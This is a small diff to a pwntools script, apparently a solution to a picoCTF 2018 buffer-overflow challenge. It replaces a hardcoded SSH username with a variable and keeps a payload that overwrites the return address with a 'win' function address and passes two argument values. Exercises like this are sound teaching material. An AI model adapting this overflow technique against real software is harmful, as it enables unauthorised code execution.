@@ -2,7 +2,7 @@ from pwn import *
 
 win_addr = 0x080485cb
 
-s = ssh(host='2018shell3.picoCTF.com', user = 'kruzXavier')
+s = ssh(host='2018shell3.picoCTF.com', user = user)
 
 payload = 'a'*(0x6c + 0x4) + p32(win_addr) + 'a'*4 + p32(0xdeadbeef) + p32(0xdeadc0de) 
 
